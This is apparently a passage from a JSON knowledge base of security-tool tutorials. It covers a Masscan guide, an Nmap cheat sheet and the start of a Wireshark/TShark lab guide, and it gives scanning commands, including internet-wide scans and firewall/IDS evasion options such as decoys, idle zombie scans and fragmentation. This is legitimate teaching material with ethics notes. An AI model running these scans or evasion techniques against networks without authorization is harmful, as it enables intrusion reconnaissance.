Port Status](https://www.hackingarticles.in/nmap-for-pentester-port-status/)\n10. [How to Detect NMAP Scan Using Snort](https://www.hackingarticles.in/detect-nmap-scan-using-snort/)\n11. [Understanding Guide to Nmap Firewall Scan (Part 2)](https://www.hackingarticles.in/understanding-guide-nmap-firewall-scan-part-2/)\n12. [Understanding Guide to Nmap Firewall Scan (Part 1)](https://www.hackingarticles.in/understanding-guide-nmap-firewall-scan-part-1/)\n13. [Understanding Nmap Scan with Wireshark](https://www.hackingarticles.in/understanding-nmap-scan-wireshark/)\n14. [Password Cracking using Nmap](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)\n15. [Vulnerability Scan](https://www.hackingarticles.in/nmap-for-pentester-vulnerability-scan/)\n16. [Network Scanning using NMAP (Beginner Guide)](https://www.hackingarticles.in/network-scanning-using-nmap-beginner-guide/)\n17. [MSSQL Penetration Testing using Nmap](https://www.hackingarticles.in/mssql-for-pentesternmap/)\n18. [MySQL Penetration Testing with Nmap](https://www.hackingarticles.in/mysql-penetration-testing-nmap/)"
      },
      {
        "title": "Masscan — Complete Detailed Guide",
        "content": "# 🛠️📡 Masscan — Complete Detailed Guide\n\n> **📑 Sections numbered** Each section contains:\n>\n> * **ℹ️ What it is / ❓Why it matters** — short conceptual explanation.\n> * **💻 Step-by-step commands** — runnable commands with safe defaults.\n> * **👀 What to expect** — typical output or behavior.\n> * **⚠️ Troubleshooting & 📝 tips** — common problems and fixes.\n> * **🛡️ Safety / ethics note** — when applicable.\n\n---\n\n## 1️⃣ What is Masscan?\n\n### ℹ️ What it is / ❓Why it matters\n\nMasscan (by 👨‍💻 Robert Graham) is a ⚡ high‑speed 🖧 port scanner optimized for 🌐 Internet‑scale discovery. It uses its own 🏎️ TCP/IP stack and 📦 packet transmitter to achieve very high packet-per-second rates. Use cases include 🔍 fast reconnaissance, 📊 large inventory, and discovery before 🔎 deep scanning with tools like Nmap.\n\n### 💻 Step-by-step commands — safe defaults\n\n```bash\n# Check masscan exists & version\nmasscan --version\n\n# Conservative local discovery\nsudo masscan 192.168.1.0/24 -p80,443,22 --rate 100\n```\n\n### 👀 What to expect\n\nConsole shows each 🖥️ IP with open 🔌 ports, e.g., `Discovered open port 80/tcp on 192.168.1.5`. Low rates ✅ safe for normal LAN traffic.\n\n### ⚠️ Troubleshooting & 📝 tips\n\n* If `masscan` ❌ found, recheck install path.\n* If results incomplete, lower `--rate` 🐢 and increase `--retries` 🔄.\n\n### 🛡️ Safety / ethics note\n\nOnly scan 🏠 owned systems or with ✍️ written permission.\n\n---\n\n## 2️⃣ Installation & Setup\n\n### ℹ️ What it is / ❓Why it matters\n\nInstallation ensures latest stable binary 🟢 and permissions to send raw 📦 packets (may need 👑 root).\n\n### 💻 Step-by-step commands — Linux\n\n```bash\n# Quick install\nsudo apt update && sudo apt install -y masscan\n\n# Build from source\ngit clone https://github.com/robertdavidgraham/masscan.git\ncd masscan\nmake\nsudo make install\n\n# Optional non-root execution\nsudo setcap cap_net_raw+ep $(which masscan)\n```\n\n### 💻 Step-by-step commands — macOS\n\n```bash\nbrew install masscan\n```\n\n### 💻 Step-by-step commands — Windows\n\n```text\n# Download binary from GitHub\n# If compiling, install Npcap + Visual Studio\n```\n\n### 👀 What to expect\n\n`masscan` binary ready for CLI 💻. On Windows, ready to run.\n\n### ⚠️ Troubleshooting & 📝 tips\n\n* `make` ❌ errors: check gcc, make, libpcap-dev ✅.\n* `setcap` may ❌ work in minimal containers.\n\n### 🛡️ Safety / ethics note\n\nDo not scan third-party networks without permission.\n\n---\n\n## 3️⃣ Core Syntax & Concepts\n\n### ℹ️ What it is / ❓Why it matters\n\nUnderstand command 🏗️, target 🎯 formats, and port 🔢 specs to avoid accidental wide scans.\n\n### 💻 Step-by-step commands — basics\n\n```bash\nsudo masscan [targets] -p[ports] --rate [pps]\n```\n\n### 🎯 Target formats\n\n* Single IP: `192.168.1.5`\n* Range: `192.168.1.1-192.168.1.254`\n* CIDR: `10.0.0.0/8`\n* Multiple: `192.168.1.0/24,203.0.113.0/24`\n\n### 🔢 Port formats\n\n* Single: `-p80`\n* List: `-p80,443,22`\n* Range: `-p1-1000`\n* All: `-p1-65535`\n\n### 👀 What to expect\n\nClear scanning commands. Confirm targets ✅.\n\n### ⚠️ Troubleshooting & 📝 tips\n\n* Mistyped CIDR → wide scan 🌐❌.\n* Use `--exclude` 🚫 sensitive ranges.\n\n### 🛡️ Safety / ethics note\n\nDouble-check `targets` & `--rate` before scan.\n\n---\n\n## 4️⃣ Protocols (TCP, UDP, SCTP)\n\n### ℹ️ What it is / ❓Why it matters\n\nServices run on different protocols. Masscan default TCP ⚡ but can scan UDP 🔄 & SCTP 📦.\n\n### 💻 Commands examples\n\n```bash\n# TCP\nsudo masscan 192.168.1.0/24 -p80 --rate 100\n# UDP\nsudo masscan 192.168.1.0/24 -pU:53,161 --rate 200\n# TCP+UDP\nsudo masscan 192.168.1.0/24 -p80,443,U:53 --rate 200\n# SCTP\nsudo masscan 192.168.1.0/24 -pS:36412 --rate 100\n```\n\n### 👀 What to expect\n\nTCP ✅ fastest, UDP 🐢 less reliable, may need Nmap follow-up.\n\n### ⚠️ Troubleshooting & 📝 tips\n\n* UDP few hits → lower `--rate` & add `--retries`.\n\n### 🛡️ Safety / ethics note\n\nUDP spikes ICMP ⚡ alerts; scan responsibly.\n\n---\n\n## 5️⃣ Rate Control & Performance\n\n### ℹ️ What it is / ❓Why it matters\n\n`--rate` controls 📦 packets/sec. Balance speed ⚡ vs. network 🖧 impact.\n\n### 💻 Step-by-step commands\n\n```bash\n# Slow\nsudo masscan 192.168.1.0/24 -p80 --rate 100\n# Medium\nsudo masscan 10.0.0.0/8 -p80,443 --rate 1000\n# Fast (lab)\nsudo masscan 0.0.0.0/0 -p80,443 --rate 100000 --exclude 10.0.0.0/8,192.168.0.0/16\n```\n\n### 👀 What to expect\n\nLow rates ✅ reliable. High rates ⚠️ may miss responses.\n\n### ⚠️ Troubleshooting & 📝 tips\n\n* Monitor `--stats` 📊. Reduce rate if drops.\n* Split subnets or NICs for big scans.\n\n### 🛡️ Safety / ethics note\n\nHigh rates ⚡ resemble DoS 🚫.\n\n---\n\n## 6️⃣ Output Formats & Handling\n\n### ℹ️ Why it matters\n\nSupports JSON 📝, XML 📄, grepable 📌 — good for automation 🤖.\n\n### 💻 Commands\n\n```bash\n# JSON\nsudo masscan 192.168.1.0/24 -p80 -oJ scan.json --rate 100\n# XML\nsudo masscan 192.168.1.0/24 -p80 -oX scan.xml --rate 100\n# Grepable\nsudo masscan 192.168.1.0/24 -p80 -oG scan.gnmap --rate 100\n# List\nsudo masscan 192.168.1.0/24 -p80 -oL scan.list --rate 100\n```\n\n### 👀 What to expect\n\nMachine-readable ✅, JSON/XML best for automation.\n\n### ⚠️ Tips\n\n* Use `jq` for JSON parsing 🔍.\n* Timestamp outputs 🕒.\n\n### 🛡️ Safety\n\nKeep outputs secure 🔒.\n\n---\n\n## 7️⃣ Advanced Options (Source, Interface, Packet Fields)\n\n### ℹ️ Why it matters\n\nBind interface, tweak source IP/port 🔢, TTL ⏱️, randomize 🔀 packets.\n\n### 💻 Commands\n\n```bash\nsudo masscan 192.168.1.0/24 -p80 --interface eth1 --rate 500\nsudo masscan 192.168.1.0/24 -p80 --source-ip 192.168.1.50 --rate 200\nsudo masscan 192.168.1.0/24 -p80 --source-port 40000-50000 --rate 200\nsudo masscan 192.168.1.0/24 -p80 --ttl 64 --rate 200\nsudo masscan 192.168.1.0/24 -p80 --randomize-hosts --rate 200\n```\n\n### 👀 What to expect\n\nPackets look different 🛡️, affects firewall 🔥/IDS 🕵️ reactions.\n\n### ⚠️ Tips\n\n* Source IP must route correctly 🌐.\n* Spoofing may ❌ work.\n\n### 🛡️ Safety\n\nNo spoofing on others' networks ⚠️.\n\n---\n\n## 8️⃣ Stealth Techniques 🕵️ & When to Use\n\n### ℹ️ Why it matters\n\nReduce detectability 👻: slow 🐢, fragmentation 🧩, random 🔀.\n\n### 💻 Commands\n\n```bash\nsudo masscan 192.168.1.0/24 -p80 --rate 10 --randomize-hosts\nsudo masscan 192.168.1.0/24 -p80 --fragment --rate 50\nsudo masscan 192.168.1.0/24 -p80 --source-ip 192.168.1.10,192.168.1.20 --rate 50\n```\n\n### 👀 What to expect\n\nFewer detections ⚠️, slower ⏳ completion.\n\n### ⚠️ Tips\n\n* Modern IDS/IPS resilient 💪.\n* Fragmentation increases network load 🌐.\n\n### 🛡️ Safety\n\nUse only with written authorization ✍️.\n\n---\n\n## 9️⃣ Configuration Files 📂\n\n### ℹ️ Why it matters\n\nRepeatable scans 🔁, easier parameter management ⚙️.\n\n### 💻 Commands\n\n```bash\nmasscan --echo > masscan.conf\nsudo masscan -c masscan.conf\nsudo masscan -c masscan.conf --rate 200\n```\n\n### 👀 What to expect\n\nSimplified commands 📝.\n\n### ⚠️ Tips\n\n* CLI overrides configs ⚡.\n* Separate configs for lab 🧪, prod 🏭, research 🔬.\n\n### 🛡️ Safety\n\nKeep configs 🔒.\n\n---\n\n## 🔟 Practical Examples & Use Cases\n\n### ℹ️ Why it matters\n\nApply Masscan in real scenarios 🏗️.\n\n### 💻 Commands\n\n```bash\nsudo masscan 192.168.1.0/24 -p80,443,22,21 --rate 200 -oJ web-scan.json\nfor net in 10.0.{0..3}.0/24; do\n  sudo masscan $net -p80,443,8080,8443 --rate 2000 -oL web-$net.list\ndone\nsudo masscan 0.0.0.0/0 -p80,443 --rate 100000 --exclude 10.0.0.0/8,192.168.0.0/16,172.16.0.0/12\n```\n\n### 👀 What to expect\n\nInternal scans ✅ safe, fast ⚡. Internet scans ⚠️ huge traffic 🚨.\n\n### ⚠️ Tips\n\n* Split jobs by subnet 🖧.\n* Use `--exclude` 🚫 sensitive networks.\n\n### 🛡️ Safety\n\nInternet scanning requires explicit permission ✍️.\n\n---\n\n## 1️⃣1️⃣ Integration with Nmap & Pipelines 🔗\n\n### ℹ️ Why it matters\n\nMasscan 🔍 discovery + Nmap 🧪 analysis = efficient two-step ✅.\n\n### 💻 Commands\n\n```bash\nsudo masscan 192.168.1.0/24 -p1-65535 --rate 1000 -oX masscan.xml\ngrep 'portid' masscan.xml | grep 'state=\"open\"' | awk -F'\"' '{print $4\":\"$8}' | sort -u > open_ports.txt\nwhile read -r line; do\n  host=$(echo \"$line\" | cut -d: -f1)\n  port=$(echo \"$line\" | cut -d: -f2)\n  nmap -sV -p$port $host\ndone < open_ports.txt\n```\n\n### 👀 What to expect\n\nMasscan 🔎 narrows targets, Nmap 🕵️‍♂️ gives service info.\n\n### ⚠️ Tips\n\n* Use JSON + `jq` 🔍.\n* Batch Nmap jobs for many hosts ⚡.\n\n### 🛡️ Safety\n\nCoordinate with asset owners 👥.\n\n---\n\n## 1️⃣2️⃣ Performance Tuning & System Optimization ⚙️\n\n### ℹ️ Why it matters\n\nTuning OS 🖥️ reduces kernel bottlenecks 🧱.\n\n### 💻 Commands\n\n```bash\nulimit -n 65535\nsudo bash -c 'cat >> /etc/sysctl.conf <<EOF\nnet.core.rmem_max = 134217728\nnet.core.wmem_max = 134217728\nEOF'\nsudo sysctl -p\nsudo masscan 192.168.1.0/24 -p80 --interface eth1 --rate 5000\n```\n\n### 👀 What to expect\n\nBetter NIC utilization 🖧, fewer drops ❌.\n\n### ⚠️ Tips\n\n* Check `dmesg` 📜.\n* Monitor resources 🖥️.\n\n### 🛡️ Safety\n\nApply during maintenance 🛠️.\n\n---\n\n## 1️⃣3️⃣ Common Issues & Fixes 🐞\n\n### ℹ️ Why it matters\n\nQuick resolution for frequent problems ⚡.\n\n### Examples\n\n* Permission ❌:\n\n```bash\nsudo setcap cap_net_raw+ep $(which masscan) || sudo\n```\n\n* High packet loss 🔻: lower `--rate`, retry 🔄.\n* Unexpected targets ❌: check `targets`, `--exclude`.\n* Parsing fails: use JSON + `jq`.\n\n### 👀 What to expect\n\nMost issues resolved by adjusting ⚡ rate, permissions 🔑, targets 🎯.\n\n### ⚠️ Tips\n\n* Use `--stats` 📊.\n* Check `masscan --version` 🏷️.\n\n### 🛡️ Safety\n\nAvoid aggressive scans on prod 🏭.\n\n---\n\n## 1️⃣4️⃣ Best Practices & Checklist ✅\n\n### ℹ️ Why it matters\n\nRun responsible, auditable scans 📋.\n\n### Checklist\n\n1️⃣ Obtain written authorization ✍️\n2️⃣ Verify targets 🎯\n3️⃣ Start with low `--rate` 🐢\n4️⃣ Timestamp outputs 🕒\n5️⃣ Monitor network load 🌐\n6️⃣ Coordinate with SOC/NOC 👥\n7️⃣ Archive results 🔒\n\n### 👀 What to expect\n\nFewer incidents ⚠️, auditable records 📑.\n\n### 🛡️ Safety\n\nDocument everything 📝.\n\n---\n\n## 1️⃣5️⃣ Legal & Responsible Use ⚖️\n\n### ℹ️ Why it matters\n\nReminder of legal boundaries 🚔.\n\n### Summary\n\nUse Masscan only for:\n\n* 🏠 Own assets\n* ✍️ Written client authorization\n* 🧪 Lab/research environments\n* 🤝 Coordinated permissioned research\n\nUnauthorized scans ❌ illegal 🌐.\n\n### 🛡️ Safety\n\nStop if unsure 🛑. Get legal + written scope ✍️.\n\n---\n\n## 📎 Appendix A — Quick Commands\n\n```bash\nsudo masscan 192.168.1.0/24 -p80,443,22 --rate 100 -oJ scan.json\nsudo masscan 10.0.0.0/8 -p80 --interface eth1 --rate 2000 -oL webservers.list\nsudo masscan 192.168.1.0/24 -p1-65535 --rate 1000 -oX masscan.xml\njq -r '.[] | \"\\(.ip):\\(.ports[]?.port)\"' masscan.json | sort -u > open_ports.txt\n```\n\n---\n\n## 📎 Appendix B — Troubleshooting Cheat Sheet 🐛\n\n* Permission denied ❌: `sudo setcap cap_net_raw+ep $(which masscan)`\n* No responses ❌: lower `--rate`, check interface 🌐\n* High packet loss 🔻: reduce `--rate`\n* Unexpected targets ❌: verify CIDR, `--exclude`\n\n---\n\n## 📎 Appendix C — Lab Exercise 🧪\n\n1️⃣ Lab network: `192.168.50.0/24` with 3 VMs 🌐: web 🌐 (80/443), ssh 🔒 (22), db 🗄️ (3306)\n2️⃣ Run scan from scanner VM:\n\n```bash\nsudo masscan 192.168.50.0/24 -p1-1024 --rate 200 -oJ lab-scan.json\n```\n\n3️⃣ Parse `lab-s\n"
      },
      {
        "title": "Nmap Cheat Sheet",
        "content": "# Nmap Cheat Sheet\nReference guide for scanning networks with Nmap.\n\n## What is Nmap?\nNmap (\"Network Mapper\") is a free and open source utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running. It was designed to rapidly scan large networks, but works fine against single hosts.\n\n## How to Use Nmap\nNmap can be used in a variety of ways depending on the user's level of technical expertise.\n\n| Technical Expertise | Usage |\n|:--------------------|:------|\n| Beginner            | [Zenmap](https://nmap.org/zenmap/) the graphical user interface for Nmap |\n| Intermediate        | [Command line](https://nmap.org/) |\n| Advanced            | Python scripting with the [Python-Nmap](https://pypi.org/project/python-nmap/) package |\n\n### Command Line\n```shell\nnmap [ <Scan Type> ...] [ <Options> ] { <target specification> }\n```\n\n## Basic Scanning Techniques\nThe `-s` switch determines the type of scan to perform.\n\n| Nmap Switch | Description                 |\n|:------------|:----------------------------|\n| **-sA**     | ACK scan                    |\n| **-sF**     | FIN scan                    |\n| **-sI**     | IDLE scan                   |\n| **-sL**     | DNS scan (a.k.a. list scan) |\n| **-sN**     | NULL scan                   |\n| **-sO**     | Protocol scan               |\n| **-sP**     | Ping scan                   |\n| **-sR**     | RPC scan                    |\n| **-sS**     | SYN scan                    |\n| **-sT**     | TCP connect scan            |\n| **-sW**     | Windows scan                |\n| **-sX**     | XMAS scan                   |\n\n### Scan a Single Target\n```shell\nnmap [target]\n```\n\n### Scan Multiple Targets\n```shell\nnmap [target1, target2, etc]\n```\n\n### Scan a List of Targets\n```shell\nnmap -iL [list.txt]\n```\n\n### Scan a Range of Hosts\n```shell\nnmap [range of IP addresses]\n```\n\n### Scan an Entire Subnet\n```shell\nnmap [ip address/cdir]\n```\n\n### Scan Random Hosts\n```shell\nnmap -iR [number]\n```\n\n### Exclude Targets From a Scan\n```shell\nnmap [targets] --exclude [targets]\n```\n\n### Exclude Targets Using a List\n```shell\nnmap [targets] --excludefile [list.txt]\n```\n\n### Perform an Aggresive Scan\n```shell\nnmap -A [target]\n```\n\n### Scan an IPv6 Target\n```shell\nnmap -6 [target]\n```\n\n## Port Scanning Options\n\n### Perform a Fast Scan\n```shell\nnmap -F [target]\n```\n\n### Scan Specific Ports\n```shell\nnmap -p [port(s)] [target]\n```\n\n### Scan Ports by Name\n```shell\nnmap -p [port name(s)] [target]\n```\n\n### Scan Ports by Protocol\n```shell\nnmap -sU -sT -p U:[ports],T:[ports] [target]\n```\n\n### Scan All Ports\n```shell\nnmap -p 1-65535 [target]\n```\n\n### Scan Top Ports\n```shell\nnmap --top-ports [number] [target]\n```\n\n### Perform a Sequential Port Scan\n```shell\nnmap -r [target]\n```\n\n### Attempt to Guess an Unknown OS\n```shell\nnmap -O --osscan-guess [target]\n```\n\n### Service Version Detection\n```shell\nnmap -sV [target]\n```\n\n### Troubleshoot Version Scan\n```shell\nnmap -sV --version-trace [target]\n```\n\n### Perform a RPC Scan\n```shell\nnmap -sR [target]\n```\n\n## Discovery Options\n**Host Discovery**\nThe `-p` switch determines the type of ping to perform.\n\n| Nmap Switch | Description                 |\n|:------------|:----------------------------|\n| **-PI**     | ICMP ping                   |\n| **-Po**     | No ping                     |\n| **-PS**     | SYN ping                    |\n| **-PT**     | TCP ping                    |\n\n### Perform a Ping Only Scan\n```shell\nnmap -sn [target]\n```\n\n### Do Not Ping\n```shell\nnmap -Pn [target]\n```\n\n### TCP SYN Ping\n```shell\nnmap -PS [target]\n```\n\n### TCP ACK Ping\n```shell\nnmap -PA [target]\n```\n\n### UDP Ping\n```shell\nnmap -PU [target]\n```\n\n### SCTP INIT Ping\n```shell\nnmap -PY [target]\n```\n\n### ICMP Echo Ping\n```shell\nnmap -PE [target]\n```\n### ICMP Timestamp Ping\n```shell\nnmap -PP [target]\n```\n\n### ICMP Address Mask Ping\n```shell\nnmap -PM [target]\n```\n\n### IP Protocol Ping\n```shell\nnmap -PO [target]\n```\n\n### ARP ping\n```shell\nnmap -PR [target]\n```\n\n### Traceroute\n```shell\nnmap --traceroute [target]\n```\n\n### Force Reverse DNS Resolution\n```shell\nnmap -R [target]\n```\n\n### Disable Reverse DNS Resolution\n```shell\nnmap -n [target]\n```\n\n### Alternative DNS Lookup\n```shell\nnmap --system-dns [target]\n```\n\n### Manually Specify DNS Server\nCan specify a single server or multiple.\n```shell\nnmap --dns-servers [servers] [target]\n```\n\n### Create a Host List\n```shell\nnmap -sL [targets]\n```\n\n## Port Specification and Scan Order\n\n| Nmap Switch | Description                 |\n|:------------|:----------------------------|\n\n## Service/Version Detection\n\n| Nmap Switch | Description                  |\n|:------------|:-----------------------------|\n| **-sV**     | Enumerates software versions |\n\n## Script Scan\n\n| Nmap Switch | Description             |\n|:------------|:------------------------|\n| **-sC**     | Run all default scripts |\n\n## OS Detection\n\n| Nmap Switch | Description                 |\n|:------------|:----------------------------|\n\n## Timing and Performance\nThe `-t` switch determines the speed and stealth performed.\n\n| Nmap Switch | Description                 |\n|:------------|:----------------------------|\n| **-T0**     | Serial, slowest scan        |\n| **-T1**     | Serial, slow scan           |\n| **-T2**     | Serial, normal speed scan   |\n| **-T3**     | Parallel, normal speed scan |\n| **-T4**     | Parallel, fast scan         |\n\nNot specifying a `T` value will default to `-T3`, or normal speed.\n\n## Firewall Evasion Techniques\n\n### Firewall/IDS Evasion and Spoofing\n| Nmap Switch | Description                 |\n|:------------|:----------------------------|\n\n### Fragment Packets\n```shell\nnmap -f [target]\n```\n\n### Specify a Specific MTU\n```shell\nnmap --mtu [MTU] [target]\n```\n\n### Use a Decoy\n```shell\nnmap -D RND:[number] [target]\n```\n\n### Idle Zombie Scan\n```shell\nnmap -sI [zombie] [target]\n```\n\n### Manually Specify a Source Port\n```shell\nnmap --source-port [port] [target]\n```\n\n### Append Random Data\n```shell\nnmap --data-length [size] [target]\n```\n\n### Randomize Target Scan Order\n```shell\nnmap --randomize-hosts [target]\n```\n\n### Spoof MAC Address\n```shell\nnmap --spoof-mac [MAC|0|vendor] [target]\n```\n\n### Send Bad Checksums\n```shell\nnmap --badsum [target]\n```\n  \n## Advanced Scanning Functions\n\n### TCP SYN Scan\n```shell\nnmap -sS [target]\n```\n\n### TCP Connect Scan\n```\nnmap -sT [target]\n```\n\n### UDP Scan\n```shell\nnmap -sU [target]\n```\n\n### TCP NULL Scan\n```shell\nnmap -sN [target]\n```\n\n### TCP FIN Scan\n```shell\nnmap -sF [target]\n```\n\n### Xmas Scan\n```shell\nnmap -sA [target]\n```\n\n### TCP ACK Scan\n```shell\nnmap -sA [target]\n```\n\n### Custom TCP Scan\n```shell\nnmap --scanflags [flags] [target]\n```\n\n### IP Protocol Scan\n```shell\nnmap -sO [target]\n```\n\n### Send Raw Ethernet Packets\n```shell\nnmap --send-eth [target]\n```\n\n### Send IP Packets\n```shell\nnmap --send-ip [target]\n```\n\n## Timing Options\n\n### Timing Templates\n```shell\nnmap -T[0-5] [target]\n```\n\n### Set the Packet TTL\n```shell\nnmap --ttl [time] [target]\n```\n\n### Minimum NUmber of Parallel Operations\n```shell\nnmap --min-parallelism [number] [target]\n```\n\n### Maximum Number of Parallel Operations\n```shell\nnmap --max-parallelism [number] [target]\n```\n\n### Minimum Host Group Size\n```shell\nnmap --min-hostgroup [number] [targets]\n```\n\n### Maximum Host Group Size\n```shell\nnmap --max-hostgroup [number] [targets]\n```\n\n### Maximum RTT Timeout\n```shell\nnmap --initial-rtt-timeout [time] [target]\n```\n\n### Initial RTT Timeout\n```shell\nnmap --max-rtt-timeout [TTL] [target]\n```\n\n### Maximum Number of Retries\n```shell\nnmap --max-retries [number] [target]\n```\n\n### Host Timeout\n```shell\nnmap --host-timeout [time] [target]\n```\n\n### Minimum Scan Delay\n```shell\nnmap --scan-delay [time] [target]\n```\n\n### Maxmimum Scan Delay\n```shell\nnmap --max-scan-delay [time] [target]\n```\n\n### Minimum Packet Rate\n```shell\nnmap --min-rate [number] [target]\n```\n\n### Maximum Packet Rate\n```shell\nnmap --max-rate [number] [target]\n```\n\n### Defeat Reset Rate Limits\n```shell\nnmap --defeat-rst-ratelimit [target]\n```\n\n## Output Options\n\n| Nmap Switch | Description   |\n|:------------|:--------------|\n| ``-oN``     | Normal output |\n| ``-oX``     | XML output    |\n| ``-oA``     | Normal, XML, and Grepable format all at once |\n\n### Save Output to a Text File\n```shell\nnmap -oN [scan.txt] [target]\n```\n\n### Save Output to a XML File\n```shell\nnmap -oX [scan.xml] [target]\n```\n\n### Grepable Output\n```shell\nnmap -oG [scan.txt] [target]\n```\n\n### Output All Supported File Types\n```shell\nnmap -oA [path/filename] [target]\n```\n\n### Periodically Display Statistics\n```shell\nnmap --stats-every [time] [target]\n```\n\n### 1337 Output\n```shell\nnmap -oS [scan.txt] [target]\n```\n\n## Compare Scans\n\n### Comparison Using Ndiff\n```shell\nndiff [scan1.xml] [scan2.xml]\n```\n\n### Ndiff Verbose Mode\n```shell\nndiff -v [scan1.xml] [scan2.xml]\n```\n\n### XML Output Mode\n```shell\nndiff --xml [scan1.xml] [scan2.xml]\n```\n\n## Troubleshooting and Debugging\n\n### Get Help\n```shell\nnmap -h\n```\n\n### Display Nmap Version\n```shell\nnmap -V\n```\n\n### Verbose Output\n```shell\nnmap -v [target]\n```\n\n### Debugging\n```shell\nnmap -d [target]\n```\n\n### Display Port State Reason\n```shell\nnmap --reason [target]\n```\n\n### Only Display Open Ports\n```shell\nnmap --open [target]\n```\n\n### Trace Packets\n```shell\nnmap --packet-trace [target]\n```\n\n### Display Host Networking\n```shell\nnmap --iflist\n```\n\n### Specify a Network Interface\n```shell\nnmap -e [interface] [target]\n```\n\n## Nmap Scripting Engine\n\n### Execute Individual Scripts\n```shell\nnmap --script [script.nse] [target]\n```\n\n### Execute Multiple Scripts\n```shell\nnmap --script [expression] [target]\n```\n\n### Execute Scripts by Category\n```shell\nnmap --script [category] [target]\n```\n\n### Execute Multiple Script Categories\n```shell\nnmap --script [category1,category2,etc]\n```\n\n### Troubleshoot Scripts\n```shell\nnmap --script [script] --script-trace [target]\n```\n\n### Update the Script Database\n```shell\nnmap --script-updatedb\n```\n\n\n**Reference Sites**\n- [X] [Nmap - The Basics](https://www.youtube.com/watch?v=_JvtO-oe8k8)  \n- [ ] [Reference link 1](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/)  \n- [ ] [Beginner's Guide to Nmap](https://www.linux.com/learn/beginners-guide-nmap)  \n- [ ] [Top 32 Nmap Command](https://www.cyberciti.biz/security/nmap-command-examples-tutorials/)  \n- [ ] [Nmap Linux man page](https://linux.die.net/man/1/nmap)  \n- [ ] [29 Practical Examples of Nmap Commands](https://www.tecmint.com/nmap-command-examples/)  \n- [ ] [Nmap Scanning Types, Scanning Commands , NSE Scripts](https://medium.com/@infosecsanyam/nmap-cheat-sheet-nmap-scanning-types-scanning-commands-nse-scripts-868a7bd7f692)  \n- [ ] [Nmap CheatSheet](https://www.cheatography.com/netwrkspider/cheat-sheets/nmap-cheatsheet/)  \n- [ ] [Nmap Cheat Sheet](https://highon.coffee/blog/nmap-cheat-sheet/)  \n- [ ] [Nmap Cheat Sheet: From Discovery to Exploits](https://resources.infosecinstitute.com/nmap-cheat-sheet/)  \n- [ ] [Nmap: my own cheatsheet](https://www.andreafortuna.org/2018/03/12/nmap-my-own-cheatsheet/)  \n- [ ] [NMAP Commands Cheatsheet](https://hackersonlineclub.com/nmap-commands-cheatsheet/)  \n- [ ] [Nmap Cheat Sheet](https://www.stationx.net/nmap-cheat-sheet/)  \n- [ ] [Nmap Cheat Sheet](http://nmapcookbook.blogspot.com/2010/02/nmap-cheat-sheet.html)  "
      }
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Wireshark",
    "description": "Network protocol analyzer for deep packet inspection.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "packet analysis",
      "troubleshooting",
      "pcap"
    ],
    "color": "#4be5d0",
    "articles": [
      {
        "title": "Wireshark Complete Lab Guide — Detailed Commands & Examples",
        "content": "\n# Wireshark Complete Lab Guide — Detailed Commands & Examples\n\n---\n\n## 1. Introduction\n\n**Wireshark** is a free, open-source network protocol analyzer for capturing and analyzing traffic.  \nIt is widely used for network troubleshooting, cybersecurity, malware investigation, and protocol development.\n\n**Safety / ethics:**  \nOnly capture traffic on networks you are authorized to monitor.\n\n---\n\n## 2. Installation & Setup\n\n### 2.1 Windows\n```powershell\n# Download Wireshark installer\n# Run as Administrator\n# Install Npcap (packet capture driver) when prompted\n```\n\n### 2.2 Linux\n```bash\n# Ubuntu / Debian\nsudo apt update && sudo apt install wireshark\n\n# CentOS / RHEL\nsudo yum install wireshark\n\n# Add user to capture group\nsudo usermod -a -G wireshark $USER\n```\n\n**Tip:** Log out and log in again for group permissions to take effect.\n\n---\n\n## 3. Starting Wireshark\n\n### 3.1 GUI Mode\n1. Open Wireshark.\n2. Select the interface (Ethernet/Wi-Fi).\n3. Start capture: shark fin icon or `Ctrl+E`.\n4. Stop capture: red square icon.\n\n**Interface Overview:**\n- **Packet List Pane:** Summary of packets\n- **Packet Details Pane:** Protocol hierarchy\n- **Packet Bytes Pane:** Hex/ASCII raw data\n\n**Tip:** Apply filters to reduce capture size.\n\n---\n\n### 3.2 CLI Mode — TShark\n\n#### List Interfaces\n```bash\ntshark -D\n# Output Example:\n# 1. enp0s3\n# 2. wlan0\n```\n\n#### Capture Packets\n```bash\n# Capture live packets on interface 1\ntshark -i 1\n\n# Capture only 50 packets\ntshark -i 1 -c 50\n\n# Capture and save to file\ntshark -i 1 -w mycapture.pcap\n\n# Read capture file\ntshark -r mycapture.pcap\n```\n\n#### Live Example\n```bash\ntshark -i 1 -c 10\n# Output:\n# 1 0.000000 192.168.1.100 → 192.168.1.1 TCP 74 443 → 53764 [SYN] Seq=0 Win=64240\n# 2 0.001234 192.168.1.1 → 192.168.1.100 TCP 74 53764 → 443 [SYN, ACK] Seq=0 Ack=1\n```\n\n**Tip:** Use `sudo` if non-root cannot access interface.\n\n---\n\n## 4. Capture Filters (BPF)\n\n**Purpose:** Reduce unnecessary traffic during capture.\n\n```bash\n# Capture only HTTP\ntshark -i 1 -f \"port 80\"\n\n# Capture specific host\ntshark -i 1 -f \"host 192.168.1.1\"\n\n# Capture subnet\ntshark -i 1 -f \"net 192.168.1.0/24\"\n\n# Capture TCP only\ntshark -i 1 -f \"tcp\"\n\n# Capture multiple ports\ntshark -i 1 -f \"port 80 or port 443\"\n\n# Exclude SSH\ntshark -i 1 -f \"not port 22\"\n```\n\n**Live Example:**  \n```bash\ntshark -i 1 -f \"tcp port 80\" -c 5\n# Output:\n# 1 0.000000 192.168.1.100 → 93.184.216.34 TCP 74 53764 → 80 [SYN] Seq=0 Win=64240\n# 2 0.001200 93.184.216.34 → 192.168.1.100 TCP 74 80 → 53764 [SYN, ACK] Seq=0 Ack=1\n```\n\n---\n\n## 5. Display Filters\n\n**Purpose:** Refine which packets are visible after capture.\n\n### Common Filters\n```text\nhttp                 # HTTP\ntls or ssl           # HTTPS\ndns                  # DNS queries\ntcp.port == 80       # TCP 80\nudp                  # UDP packets\n```\n\n### IP Filters\n```text\nip.addr == 192.168.1.1\nip.src == 192.168.1.100\nip.dst == 8.8.8.8\nip.addr == 192.168.1.0/24\n```\n\n### Advanced Filters\n```text\nhttp.request.method == \"GET\"\nhttp.response.code == 404\ntcp.flags.syn == 1\nframe.len > 